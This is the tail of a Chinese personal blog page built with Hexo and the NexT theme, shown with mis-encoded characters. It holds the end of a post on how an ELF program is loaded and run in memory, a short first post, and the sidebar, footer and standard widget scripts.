<li>æ‰§è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€ä½¿ç”¨æ ˆï¼ˆå‡½æ•°è°ƒç”¨ï¼‰å’Œå †ï¼ˆåŠ¨æ€å†…å­˜ï¼‰ï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£ç»´æŠ¤å†…å­˜æ˜ å°„å’Œæƒé™ã€‚</li>
</ul>
</li>
<li><strong>ç»ˆæ­¢ç¨‹åº</strong>ï¼šç¨‹åºæ‰§è¡Œå®Œ<code>main</code>å‡½æ•°ï¼ˆæˆ–è°ƒç”¨<code>exit</code>ï¼‰åï¼Œæ“ä½œç³»ç»Ÿå›æ”¶è¿›ç¨‹å ç”¨çš„å†…å­˜ã€CPU ç­‰èµ„æºï¼Œè¿›ç¨‹ç»ˆæ­¢ã€‚</li>
</ol>
<p><strong>æ³¨æ„</strong> ï¼š1.å¯æ‰§è¡Œæ–‡ä»¶æ˜¯elfæ ¼å¼ å¯åŠ¨é˜¶æ®µ æ“ä½œç³»ç»Ÿä¸ºèµ·åˆ†é…  <strong>è™šæ‹Ÿå†…å­˜</strong>ï¼ˆè¿ç»­ï¼‰ä¹Ÿå°±æ˜¯åœ¨æ­¤æ—¶ å †å’Œæ ˆè¯ç”Ÿï¼ˆä¸ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸç›¸åŒï¼‰å…¶ä¸­å †éœ€è¦å¯æ‰§è¡Œæ–‡ä»¶ä¸­å…·æœ‰ç”³è¯·å †æ“ä½œ è€Œ æ ˆæ˜¯ä¸ç”Ÿä¿±æ¥çš„ã€‚</p>
<p>2.ç¨‹åºå¯åŠ¨çš„åˆæœŸé˜¶æ®µï¼ˆå¦‚åˆ›å»ºè¿›ç¨‹ã€åˆ†é…è™šæ‹Ÿå†…å­˜ã€è®¾ç½®å †æ ˆï¼‰éœ€è¦æ“ä½œç³»ç»Ÿå†…æ ¸å®Œæˆï¼Œå› æ­¤ä»£ç è¿è¡Œåœ¨<strong>å†…æ ¸æ€</strong>ã€‚</p>
<p>3.è™šæ‹Ÿå†…å­˜åŠ è½½åˆ°ç‰©ç†å†…å­˜çš„è¿‡ç¨‹æ˜¯<strong>åŠ¨æ€ä¸”æŒ‰éœ€å‘ç”Ÿçš„</strong>æ‰§è¡Œåˆ°å“ªåŠ è½½åˆ°å“ª cpu åªèƒ½å¤„ç†å®é™…åœ°å€çš„å†…å®¹</p>
<p>4.å¯åŠ¨ç¨‹åºçš„è¿‡ç¨‹æœ¬è´¨æ˜¯å°†é™æ€çš„å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åˆ°ç³»ç»Ÿä¸­ï¼Œå¹¶åˆ›å»ºå¯¹åº”çš„è¿›ç¨‹</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/07/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">ç¬¬ä¸€ç¯‡åšå®¢</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-07-05 22:39:44" itemprop="dateCreated datePublished" datetime="2025-07-05T22:39:44+08:00">2025-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-07-09 01:08:38" itemprop="dateModified" datetime="2025-07-09T01:08:38+08:00">2025-07-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/hexo/" itemprop="url" rel="index"><span itemprop="name">hexo</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>9</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>å¬è¯´hexoå¾ˆå¥½ç©</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="JC"
      src="/images/tou.jpg">
  <p class="site-author-name" itemprop="name">JC</p>
  <div class="site-description" itemprop="description">Ê•Â´â€¢á´¥â€¢Â Ê”</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/rjcnb666" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;rjcnb666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2858052971@qq.com" title="E-Mail â†’ mailto:2858052971@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


 
        
        
          <!-- å…¬å‘Šæ¨¡å— -->
<div class="sidebar-module">
  <!-- æ¨¡å—æ ‡é¢˜ -->
  <h3 class="sidebar-title">
    <i class="fa fa-paw"></i> å–µ~
  </h3>
  <!-- æ¨¡å—å†…å®¹ -->
  <div class="sidebar-content">
    <p>ğŸ˜Š "å½“ä½ å¿ƒæƒ…éƒé—·çš„æ—¶å€™ï¼Œç”¨æ‰‹æ‰˜è…®å°±å¥½äº†ï¼Œæ‰‹è‡‚ä¼šå› ä¸ºå¸®ä¸Šå¿™è€Œå¼€å¿ƒçš„ã€‚" ğŸ˜Š</p>
    <p>ğŸ‘‰ 2858052971@qq.com </p>
    
  </div>
</div>
        
      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">JC</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":250,"height":250},"mobile":{"show":true}});</script></body>
</html>
